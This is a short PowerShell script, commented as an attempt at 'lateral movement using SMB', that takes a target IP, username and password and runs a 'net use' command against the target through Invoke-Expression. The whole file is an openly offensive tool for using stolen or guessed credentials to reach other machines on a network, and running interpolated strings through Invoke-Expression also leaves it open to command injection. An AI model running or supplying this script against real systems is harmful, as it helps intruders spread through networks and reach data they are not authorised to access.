param (
    [string]$TargetIP,
    [string]$Username,
    [string]$Password
)

# Attempt lateral movement using SMB
$command = "net use \\$TargetIP /user:$Username $Password"
Invoke-Expression $command
